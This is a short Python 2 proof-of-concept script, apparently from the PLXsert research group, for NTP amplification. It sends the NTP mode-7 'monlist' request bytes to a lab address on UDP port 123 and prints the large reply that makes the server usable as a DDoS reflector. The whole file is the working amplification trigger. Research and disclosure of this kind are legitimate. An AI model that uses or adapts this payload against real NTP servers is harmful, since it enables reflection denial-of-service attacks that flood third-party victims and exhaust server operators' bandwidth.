#!/usr/bin/python

##NTP POC Amplification
## PLXsert
### Based on UDP example http://pleac.sourceforge.net/pleac_python/sockets.html

import socket
# Set up a UDP socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# send
#17 00 03 2a
MSG = str('\x17\x00\x03\x2a') + str('\x00')*4
HOSTNAME = '10.0.2.15'
PORTNO = 123
s.connect((HOSTNAME, PORTNO))
if len(MSG) != s.send(MSG):
    # where to get error message "$!"
    print "cannot send to %s(%d):" % (HOSTNAME, PORTNO)
    raise SystemExit(1)
MAXLEN = 4098
(data, addr) = s.recvfrom(MAXLEN)
s.close()
# print '%s(%d) said "%s"' % (addr[0], addr[1], data)
print data
